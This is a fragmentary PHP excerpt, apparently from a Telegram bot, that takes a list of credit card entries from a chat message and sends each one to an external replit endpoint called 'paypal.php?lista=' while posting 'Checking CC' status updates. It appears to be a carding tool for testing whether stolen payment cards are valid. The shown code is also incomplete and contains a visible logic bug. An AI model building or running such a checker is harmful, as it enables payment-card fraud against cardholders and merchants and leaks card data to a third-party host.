...
if(preg_match_all("/\bpp\b/", $message)){
...
$cclist = preg_replace("/[^0-9|\n]/", "",$message);
  ...
  $x++;
   $cc1 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[0].'');
  ...
  exit();
   ...
   if (strlen($array[1]) > 28){
    ...
    $x++;
   $cc2 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[1].'');
  ...
  $x++;
   $cc3 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[2].'');
  ...
  exit();
   ...
   if (strlen($array[3]) > 29){
     $array[3] = substr($array[3],0,28);
           ...
           $x++;
   $cc4 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[3].'');
  ...
  exit();
   ...
   if (strlen($array[4]) > 29){
     ...
     $x++;
   $cc5 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[4].'');
  ...
  exit();
   ...
   if (strlen($array[5]) > 29){
     $array[5] = substr($array[5],0,28);
          ...
          $x++;
   $cc6 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[5].'');
  ...
  editMessage($chatId,"$r1%0A$r2%0A$r3%0A$r4%0A$r5%0A$r6%0AChecking CC : <code>$array[6]</code>",$mes_id);
   if (strlen($array[6]) > 29){
    ...
    $x++;
   $cc7 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[6].'');
  ...
  editMessage($chatId,"$r1%0A$r2%0A$r3%0A$r4%0A$r5%0A$r6%0A$r7%0AChecking CC : <code>$array[7]</code>",$mes_id);
   if (strlen($array[7]) > 29){
     ...
     $x++;
   $cc8 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[7].'');
 ...
 if(strlen($array[8] < 28)){
  ...
  $x++;
   $cc9 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[8].'');
...
$cc10 = file_get_contents('https://oneclass.junaidrahman2.repl.co/paypal.php?lista='.$array[9].'');
